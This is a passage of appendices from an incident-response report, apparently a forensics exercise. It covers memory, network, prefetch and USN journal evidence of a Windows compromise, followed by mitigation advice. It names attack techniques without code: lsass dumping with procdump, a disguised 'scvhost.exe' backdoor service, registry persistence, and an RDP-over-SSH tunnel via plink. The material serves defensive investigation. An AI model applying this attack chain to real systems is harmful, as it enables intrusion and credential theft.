    - **Loaded DLLs:** Included critical system DLLs such as `ntdll.dll` and `kernel32.dll`.
    - **Hidden Processes:** The process employed evasion techniques, making it partially hidden from certain process enumeration tools.

- **`plink.exe`:**
  - **Significance:** Used to establish an SSH tunnel for remote access, this process played a critical role in facilitating secure communication between the compromised host and the attacker's server.
  - **Memory Artifacts:** 
    - **Loaded DLLs:** Managed encrypted communications using `crypt32.dll` and other key system libraries.

---

#### **2. Steps Taken to Analyze the Memory Dump**

- **Volatility Framework:** Utilized to enumerate processes, inspect hidden processes, and analyze DLLs loaded by critical processes.
- **Process Listing and Verification:** Correlated findings from `pslist`, `psxview`, and `dlllist` to identify and confirm malicious activity.
- **Timeline Analysis:** Used `timeliner` to reconstruct the sequence of events leading up to and during the compromise.

---

### **Appendix F: Network Traffic Analysis**

---

This appendix summarizes the findings from the analysis of the network capture (PCAP file), focusing on key network connections and potential exfiltration channels.

---

#### **1. Network Connections**

- **SSH Tunnel Established by `plink.exe`:**
  - **Connection Details:** 
    - **Source IP:** Compromised host
    - **Destination IP:** `69.50.64.20`
    - **Port:** 22 (SSH)
  - **Significance:** The SSH tunnel was used to forward RDP traffic, enabling the attacker to maintain remote desktop access to the compromised system.

- **Other Notable Connections:**
  - **Interaction with Malicious Domain:** 
    - **Domain:** `z.moatads.com`
    - **Context:** Triggered during initial web browsing, leading to the subsequent compromise.

---

#### **2. Identification of Exfiltration Channels**

- **Potential Data Exfiltration via SSH Tunnel:**
  - **Details:** The SSH tunnel created by `plink.exe` could have been used to securely exfiltrate data from the compromised system, bypassing standard network monitoring tools.

- **Packet Captures Correlating with Key Events:**
  - **Capture Timestamp:** Correlated network traffic with the execution of `plink.exe` and other malicious activities.
  - **Exfiltration Attempts:** No direct evidence of data exfiltration was found, but the potential for such activity was identified through the SSH tunnel.

---

### **Appendix G: Prefetch and USN Journal Analysis**

---

This appendix provides an analysis of Prefetch files and USN Journal entries to confirm the execution of malicious files and detail file system activity.

---

#### **1. Prefetch Files**

- **`procdump64.exe`:**
  - **Details:** 
    - **Prefetch File:** `PROCDUMP64.EXE-7C654F89.pf`
    - **Execution Confirmed:** The file was executed on `17/08/2019` at `6:00:34 AM`.
  
- **`scvhost.exe`:**
  - **Details:** 
    - **Prefetch File:** `SCVHOST.EXE-2B54B8E0.pf`
    - **Execution Confirmed:** The file was executed briefly to establish or maintain a backdoor connection.

---

#### **2. USN Journal Entries**

- **File Creation and Modification Events:**
  - **`lsass.dmp` and `lsass.zip`:** 
    - **USN Records:** Confirm the creation and access of these files, likely used to store and potentially exfiltrate sensitive credentials.
  - **`scvhost.exe`:** 
    - **USN Records:** Show the creation and execution of this malicious executable.

---

### **Appendix H: Recommendations for Mitigation**

---

This appendix provides a list of actionable recommendations based on the findings of the investigation to prevent similar incidents in the future.

---

#### **1. Enhanced Monitoring**

- **Implementation of EDR Solutions:** Deploy Endpoint Detection and Response (EDR) tools to detect and respond to suspicious activities such as unauthorized PowerShell script executions and the creation of suspicious services.
- **Network Traffic Analysis:** Increase monitoring of network traffic for abnormal patterns, such as unexpected SSH connections or unusual data transfer volumes.

---

#### **2. User Training and Awareness**

- **Phishing Awareness:** Conduct regular training sessions on identifying phishing emails and malicious links to reduce the likelihood of initial compromises.
- **PowerShell Security:** Educate users on the risks associated with executing PowerShell scripts and enforce strict execution policies.

---

#### **3. System Hardening**

- **Registry Protection:** Implement measures to monitor and restrict modifications to critical registry keys, such as IFEO keys, to prevent unauthorized changes.
- **Service Auditing:** Regularly audit and validate all running services, particularly those with suspicious names or locations, to detect and remove malicious services like `ScvHost`.

---

### **Appendix I: Supporting Logs and Files**

---

This appendix includes raw logs, screenshots, or excerpts from analyzed files that support the findings in the report. These artifacts are referenced throughout the report and provide additional context and evidence for the investigation's conclusions.

---

#### **1. PowerShell Logs**

- **Location:** `C:\Users\Craig\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`
- **Content:** Screenshots and excerpts showing the execution of malicious scripts (`vagrant-shell.ps1`, `Sticky.ps1`, `Service.ps1`).

---

#### **2. Network Traffic Captures**

- **File:** `traffic.pcap`
- **Content:** Screenshots of Wireshark captures showing key connections, such as the SSH tunnel established by `plink.exe`.

---

#### **3. Memory Analysis Excerpts**

- **Tools Used:** Volatility Framework
- **Content:** Screenshots of memory analysis results, including process lists, hidden process detection, and DLL analysis.

---

These appendices provide the detailed evidence and analysis that support the conclusions presented in the main body of the report. They are intended for in-depth review and validation of the investigative findings.
